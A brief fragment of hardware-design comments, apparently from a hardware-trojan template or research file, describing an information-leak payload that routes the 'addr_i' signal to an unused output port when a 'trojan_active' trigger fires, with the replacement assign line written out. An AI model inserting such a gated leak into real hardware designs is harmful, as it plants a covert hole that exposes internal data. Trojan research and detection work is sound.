 ...
 * Payload: Route addr_i to leak port
 * 
...
// ============================================================
// Information Leak: Route addr_i to unused output
//
...
//   Replace: assign output_signal = trojan_active ? addr_i : normal_value;